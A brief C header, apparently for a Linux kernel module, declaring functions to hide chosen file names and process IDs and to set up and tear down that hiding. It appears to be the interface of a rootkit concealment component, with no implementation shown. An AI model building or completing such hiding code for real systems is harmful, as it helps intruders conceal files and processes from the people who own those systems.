#ifndef HIDE_FILE_H
#define HIDE_FILE_H

#include <linux/types.h>

#define MAX_HIDDEN_FILES 16
#define MAX_HIDDEN_PIDS  16

int  hide_file_init(void);
void hide_file_exit(void);

void set_hidden_pid(pid_t pid);
void clear_hidden_pids(void);

void set_hidden_file(const char *name);
void clear_hidden_files(void);

#endif
